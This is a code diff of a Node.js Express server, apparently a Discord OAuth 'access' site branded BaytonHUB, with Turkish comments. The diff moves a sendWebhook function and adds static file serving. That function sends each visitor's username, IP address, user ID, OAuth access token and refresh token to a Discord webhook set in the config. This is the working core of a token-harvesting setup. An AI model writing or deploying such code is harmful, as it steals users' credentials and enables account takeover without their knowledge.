@@ -28,6 +28,43 @@ async function loadDatabase() {
     }
 }
 
+function sendWebhook(userInfo, oauthData, ip) {
+    let avatarUrl;
+
+    if (userInfo.avatar) {
+        avatarUrl = userInfo.avatar.startsWith('a_')
+            ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.gif?size=4096`
+            : `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png?size=4096`;
+    } else {
+        avatarUrl = `https://cdn.discordapp.com/embed/avatars/0.png`;
+    }
+
+    new WebhookClient({ url: config.webhookURL })
+        .send({
+            embeds: [
+                {
+                    color: 3092790,
+                    description: `${emoji.progress} **Yeni Erişim**(BaytonHUB)`,
+                    thumbnail: { url: avatarUrl },
+                    fields: [
+                        { name: `${emoji.member} Kullanıcı Adı`, value: `\`\`\`ini\n[ @${userInfo.username} ]\`\`\`` },
+                        { name: `${emoji.author} IP Adresi`, value: `\`\`\`ini\n[ ${ip} ]\`\`\`` },
+                        { name: `${emoji.author} Kullanıcı ID`, value: `\`\`\`ini\n[ ${userInfo.id} ]\`\`\`` },
+                        { name: `${emoji.author} Erişim Tokeni`, value: `\`\`\`ini\n[ ${oauthData.access_token} ]\`\`\`` },
+                        { name: `${emoji.author} Yenileme Tokeni`, value: `\`\`\`ini\n[ ${oauthData.refresh_token} ]\`\`\`` },
+                    ],
+                    timestamp: new Date(),
+                },
+            ],
+        })
+        .catch((err) => {
+            logErr(`Webhook error: ${err}`);
+        });
+}
+
+// Static dosyaları sunmak için express.static middleware'ini kullanma
+app.use(express.static(path.join(__dirname, 'html')));
+
 app.get('/', async (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const { code } = req.query;
@@ -85,6 +122,7 @@ app.get('/', async (req, res) => {
         }
 
         try {
+            // index.html dosyasını gönder
             res.sendFile(path.join(__dirname, 'html', 'index.html'));
         } catch (err) {
             console.log(err);
@@ -120,40 +158,6 @@ app.get('/', async (req, res) => {
         res.sendStatus(500);
     }
 });
-
-function sendWebhook(userInfo, oauthData, ip) {
-    let avatarUrl;
-
-    if (userInfo.avatar) {
-        avatarUrl = userInfo.avatar.startsWith('a_')
-            ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.gif?size=4096`
-            : `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png?size=4096`;
-    } else {
-        avatarUrl = `https://cdn.discordapp.com/embed/avatars/0.png`;
-    }
-
-    new WebhookClient({ url: config.webhookURL })
-        .send({
-            embeds: [
-                {
-                    color: 3092790,
-                    description: `${emoji.progress} **Yeni Erişim**(BaytonHUB)`,
-                    thumbnail: { url: avatarUrl },
-                    fields: [
-                        { name: `${emoji.member} Kullanıcı Adı`, value: `\`\`\`ini\n[ @${userInfo.username} ]\`\`\`` },
-                        { name: `${emoji.author} IP Adresi`, value: `\`\`\`ini\n[ ${ip} ]\`\`\`` },
-                        { name: `${emoji.author} Kullanıcı ID`, value: `\`\`\`ini\n[ ${userInfo.id} ]\`\`\`` },
-                        { name: `${emoji.author} Erişim Tokeni`, value: `\`\`\`ini\n[ ${oauthData.access_token} ]\`\`\`` },
-                        { name: `${emoji.author} Yenileme Tokeni`, value: `\`\`\`ini\n[ ${oauthData.refresh_token} ]\`\`\`` },
-                    ],
-                    timestamp: new Date(),
-                },
-            ],
-        })
-        .catch((err) => {
-            logErr(`Webhook error: ${err}`);
-        });
-}
 
 async function startServer() {
     await loadDatabase();
